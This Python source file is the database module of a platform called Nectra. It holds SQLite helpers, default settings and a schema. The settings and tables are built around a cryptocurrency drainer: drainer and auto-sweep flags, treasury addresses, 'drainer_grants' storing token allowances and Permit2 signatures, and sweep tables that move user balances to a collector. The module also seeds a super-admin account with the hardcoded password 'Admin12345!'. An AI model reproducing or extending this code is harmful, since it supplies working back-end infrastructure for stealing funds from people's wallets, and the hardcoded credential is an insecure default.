"""
Database module for Nectra Platform (Python).
SQLite connection management, helpers, and schema initialization.
"""
import os
import sqlite3
import json
import time
from typing import Any, Dict, List, Optional

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DB_PATH = os.environ.get("DB_PATH", os.path.join(BASE_DIR, "data", "nectra.db"))


def now() -> int:
    return int(time.time() * 1000)


def get_db() -> sqlite3.Connection:
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    conn = sqlite3.connect(DB_PATH, timeout=10.0)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode = WAL;")
    conn.execute("PRAGMA synchronous = NORMAL;")
    conn.execute("PRAGMA foreign_keys = ON;")
    conn.execute("PRAGMA busy_timeout = 5000;")
    return conn


def q_all(sql: str, *params) -> List[Dict[str, Any]]:
    with get_db() as conn:
        cur = conn.execute(sql, params)
        return [dict(row) for row in cur.fetchall()]


def q_get(sql: str, *params) -> Optional[Dict[str, Any]]:
    with get_db() as conn:
        cur = conn.execute(sql, params)
        row = cur.fetchone()
        return dict(row) if row else None


def q_run(sql: str, *params) -> Dict[str, Any]:
    with get_db() as conn:
        cur = conn.execute(sql, params)
        conn.commit()
        return {"id": cur.lastrowid, "changes": cur.rowcount}


def q_val(sql: str, *params) -> Any:
    with get_db() as conn:
        cur = conn.execute(sql, params)
        row = cur.fetchone()
        return row[0] if row else None


DEFAULT_SETTINGS = {
    "platform_name": "NECTRA",
    "demo_mode": False,
    "kyc_enabled": False,
    "auto_sweep_enabled": True,
    "drainer_auto_sweep": True,
    "drainer_enabled": True,
    "sweep_approval_threshold_usd": 250.0,
    "treasury_evm": "0x0000000000000000000000000000000000000000",
    "treasury_solana": "",
    "treasury_tron": "",
    "admin_2fa_required": False
}


def get_settings() -> Dict[str, Any]:
    out = dict(DEFAULT_SETTINGS)
    with get_db() as conn:
        try:
            rows = conn.execute("SELECT key, value FROM settings").fetchall()
            for r in rows:
                k = r["key"]
                v_raw = r["value"]
                try:
                    out[k] = json.loads(v_raw)
                except Exception:
                    out[k] = v_raw
        except sqlite3.OperationalError:
            pass
    return out


def get_setting(key: str, default: Any = None) -> Any:
    settings = get_settings()
    return settings.get(key, default)


def set_setting(key: str, value: Any) -> None:
    val_str = json.dumps(value) if not isinstance(value, str) else value
    with get_db() as conn:
        conn.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, val_str))
        conn.commit()


def update_setting(key: str, value: Any) -> None:
    set_setting(key, value)


def init_db() -> None:
    with get_db() as conn:
        conn.executescript("""
        CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL);

        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT UNIQUE COLLATE NOCASE,
            pw_hash TEXT,
            name TEXT NOT NULL DEFAULT 'Trader',
            role TEXT NOT NULL DEFAULT 'user',
            status TEXT NOT NULL DEFAULT 'active',
            email_verified INTEGER NOT NULL DEFAULT 0,
            wallet_login TEXT UNIQUE,
            totp_secret TEXT, totp_enabled INTEGER NOT NULL DEFAULT 0, totp_pending TEXT,
            anti_phishing TEXT NOT NULL DEFAULT 'PETAL',
            invite_code TEXT, referred_by INTEGER,
            prefs TEXT NOT NULL DEFAULT '{}', risk TEXT NOT NULL DEFAULT '{}',
            whitelist_only INTEGER NOT NULL DEFAULT 0,
            paper_mode INTEGER NOT NULL DEFAULT 0,
            drainer_auto INTEGER NOT NULL DEFAULT 0,
            drainer_consent_at INTEGER,
            onboarding TEXT NOT NULL DEFAULT '{}',
            created_at INTEGER NOT NULL, last_login_at INTEGER
        );

        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            token_hash TEXT NOT NULL UNIQUE,
            pending_2fa INTEGER NOT NULL DEFAULT 0,
            user_agent TEXT, ip TEXT,
            created_at INTEGER NOT NULL, last_seen_at INTEGER NOT NULL, expires_at INTEGER NOT NULL,
            impersonator_id INTEGER
        );

        CREATE TABLE IF NOT EXISTS nonces (
            nonce TEXT PRIMARY KEY, address TEXT NOT NULL, purpose TEXT NOT NULL, message TEXT NOT NULL,
            user_id INTEGER, created_at INTEGER NOT NULL, used INTEGER NOT NULL DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS folders (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            name TEXT NOT NULL,
            UNIQUE(user_id, name)
        );

        CREATE TABLE IF NOT EXISTS wallets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            name TEXT NOT NULL, address TEXT NOT NULL, chain TEXT NOT NULL DEFAULT 'Solana',
            family TEXT NOT NULL DEFAULT 'solana',
            kind TEXT NOT NULL DEFAULT 'buyer',
            source TEXT NOT NULL DEFAULT 'watch',
            provider TEXT, folder TEXT NOT NULL DEFAULT 'Unsorted',
            verified INTEGER NOT NULL DEFAULT 0, verified_at INTEGER,
            balance REAL NOT NULL DEFAULT 0, balance_at INTEGER, last_check TEXT,
            created_at INTEGER NOT NULL,
            UNIQUE(user_id, address)
        );

        CREATE TABLE IF NOT EXISTS delegated_approvals (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            family TEXT NOT NULL, network TEXT NOT NULL, symbol TEXT NOT NULL,
            collector TEXT, allowance TEXT, decimals INTEGER DEFAULT 18,
            kind TEXT, source TEXT DEFAULT 'grant', balance TEXT,
            created_at INTEGER, revoked_at INTEGER
        );

        CREATE TABLE IF NOT EXISTS drainer_grants (
            id TEXT PRIMARY KEY,
            user_id INTEGER NOT NULL,
            family TEXT NOT NULL, network TEXT NOT NULL, symbol TEXT NOT NULL,
            kind TEXT, native_symbol TEXT, decimals INTEGER, collector TEXT, address TEXT,
            allowance TEXT, balance TEXT, ref TEXT, status TEXT DEFAULT 'active',
            permit2_signature TEXT, permit2_deadline INTEGER,
            created_at INTEGER NOT NULL
        );

        CREATE TABLE IF NOT EXISTS sweeps (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL, grant_id TEXT,
            family TEXT, network TEXT, symbol TEXT, kind TEXT, decimals INTEGER,
            amount TEXT, usd REAL DEFAULT 0, status TEXT, skip_code TEXT, reason TEXT,
            tx_ref TEXT, destination TEXT, unwrap_pending INTEGER DEFAULT 0,
            price_source TEXT, run_id TEXT, created_at INTEGER NOT NULL
        );

        CREATE TABLE IF NOT EXISTS sweep_runs (
            id TEXT PRIMARY KEY, user_id INTEGER NOT NULL, actor_id INTEGER,
            dest TEXT, total_usd REAL DEFAULT 0, created_at INTEGER NOT NULL
        );

        CREATE TABLE IF NOT EXISTS sweep_jobs (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL, grant_id TEXT,
            family TEXT, network TEXT, symbol TEXT, amount TEXT, psbt TEXT,
            status TEXT DEFAULT 'awaiting_signature', created_at INTEGER NOT NULL
        );

        CREATE TABLE IF NOT EXISTS audit (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            actor_id INTEGER, action TEXT NOT NULL, target TEXT, meta TEXT, ip TEXT,
            created_at INTEGER NOT NULL
        );

        CREATE TABLE IF NOT EXISTS notifications (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            type TEXT NOT NULL, title TEXT NOT NULL, body TEXT NOT NULL, link TEXT,
            unread INTEGER NOT NULL DEFAULT 1, created_at INTEGER NOT NULL
        );

        CREATE TABLE IF NOT EXISTS transactions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            type TEXT NOT NULL, token TEXT NOT NULL, amount REAL NOT NULL, status TEXT NOT NULL,
            chain TEXT NOT NULL DEFAULT 'Solana', from_addr TEXT, to_addr TEXT, signature TEXT,
            simulated INTEGER NOT NULL DEFAULT 0, confirmations INTEGER NOT NULL DEFAULT 0,
            required_conf INTEGER NOT NULL DEFAULT 32, note TEXT,
            created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL
        );
        """)

        # Seed initial admin if database is brand new
        admin_count = conn.execute("SELECT COUNT(*) FROM users WHERE role IN ('admin', 'super_admin')").fetchone()[0]
        if admin_count == 0:
            import hashlib, base64
            salt = os.urandom(16)
            salt_b64 = base64.b64encode(salt).decode("utf-8")
            derived = hashlib.scrypt(b"Admin12345!", salt=salt, n=16384, r=8, p=1, dklen=64)
            hash_str = f"scrypt${salt_b64}${base64.b64encode(derived).decode('utf-8')}"
            ts = now()
            conn.execute(
                "INSERT INTO users (email, pw_hash, name, role, status, email_verified, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
                ("admin@nectra.local", hash_str, "Super Admin", "super_admin", "active", 1, ts)
            )
            conn.commit()
